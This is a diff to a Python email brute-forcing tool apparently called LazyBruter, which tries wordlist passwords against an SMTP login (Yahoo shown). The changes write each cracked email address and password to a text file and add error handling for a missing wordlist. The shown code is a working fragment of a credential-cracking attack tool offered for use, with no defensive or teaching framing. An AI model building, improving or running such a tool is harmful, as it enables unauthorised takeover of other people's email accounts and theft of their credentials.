@@ -24,7 +24,16 @@ if method == "a":
             smtpserver_yahoo.login(user, password)
 
             print ("[+] Password Cracked: ", password)
+            input("Press Enter to save the result in .txt")
+            file = open("password cracked.txt","w")
+            file.write("Email: ")
+            file.write(user)
+            file.write("    Password: ")
+            file.write(password)
+            file.close()
+            input("Password saved! Search for <password cracked.txt> in LazyBruter Folder")
             break
+
         except smtplib.SMTPAuthenticationError:
             print ("[!] Password Inccorect: ", password)
 			
@@ -33,7 +42,11 @@ if method == "a":
 			
 if method == "b":
     passwfile = input("Enter the Wordlist Path: ")
+try:    
     passwfile = open(passwfile, "r")
+except:
+    print ("Wordlist not found!")
+    print (passwfile)
     print ("\nYou are about to brute force this email: ",user)
     verify = input ("Do you want to continue: [y/n]: ")
 
